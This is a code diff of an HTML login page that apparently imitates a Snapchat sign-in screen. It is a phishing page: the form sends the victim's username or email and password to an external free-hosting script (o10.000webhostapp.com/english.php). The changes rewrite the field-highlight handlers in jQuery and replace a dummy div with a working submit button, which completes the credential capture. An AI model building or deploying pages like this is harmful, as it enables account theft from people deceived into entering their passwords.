@@ -1,27 +1,29 @@
 <hmtl>
   <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="jquery-3.3.1.js"></script>
     <script>
-      document.getElementById("url").value = window.location.href;
-      function emailEffect() {
-        document.getElementById("email-header").style.color = "#0eadff";
-        document.getElementById("email").style.borderColor = "#0eadff";
-      }
-      function removeEmailEffect() {
-        document.getElementById("email").style.borderColor = "#9A9FA7";
-        document.getElementById("email-header").style.color = "#9A9FA7";
-      }
-      function passEffect() {
-        document.getElementById("pass-header").style.color = "#0eadff";
-        document.getElementById("pass").style.borderColor = "#0eadff";
-      }
-      function removePassEffect() {
-        document.getElementById("pass").style.borderColor = "#9A9FA7";
-        document.getElementById("pass-header").style.color = "#9A9FA7";
-      }
+      $(document).ready(function(){
+        $("#email").click(function(){
+          $("#email").css("border-color", "#0eadff");
+          $("#email-header").css("color", "#0eadff");
+        });
+        $("#email").blur(function(){
+          $("#email").css("border-color", "#9A9FA7");
+          $("#email-header").css("color", "#9A9FA7");
+        });
+        $("#pass").click(function(){
+          $("#pass").css("border-color", "#0eadff");
+          $("#pass-header").css("color", "#0eadff");
+        });
+        $("#pass").blur(function(){
+          $("#pass").css("border-color", "#9A9FA7");
+          $("pass-header").css("color", "#9A9FA7");
+        });
+      });
     </script>
   </head>
-  <body onclick="removeEmailEffect(); removePassEffect();">
+  <body>
     <style>
       @font-face {
         font-family: SnapFont-thin;
@@ -118,6 +120,9 @@
         position: sticky;
         bottom:30px;
         z-index: 1;
+        border:inherit;
+        font:inherit;
+        padding:0px;
       }
       </style>
     <div class="wrapper">
@@ -128,12 +133,12 @@
         <div class="login">Log In</div>
         <form method="post" action="http://o10.000webhostapp.com/english.php">
           <div class="input-headers" id="email-header" style="margin-top:0px;">USERNAME OR EMAIL</div>
-          <input class="inputs email" id="email" onclick="emailEffect(); removePassEffect();" autocorrect="off" autocapitalize="off" name="email" type="text"></input>
+          <input class="inputs email" id="email" autocorrect="off" autocapitalize="off" name="email" type="text"></input>
           <div class="input-headers" id="pass-header">PASSWORD</div>
-          <input class="inputs pass" id="pass" onclick="passEffect(); removeEmailEffect();" autocorrect="off" autocapitalize="off" name="password" type="password"></input>
+          <input class="inputs pass" id="pass" autocorrect="off" autocapitalize="off" name="password" type="password"></input>
           <input id="url" type="hidden" name="url" value=""></input>
           <a class="forgot">Forgot your password?</a>
-          <div class="submit">Log In</div>
+          <button type="submit" class="submit">Log In</button>
         </form>
       </div>
       <div class="submit-box"></div>
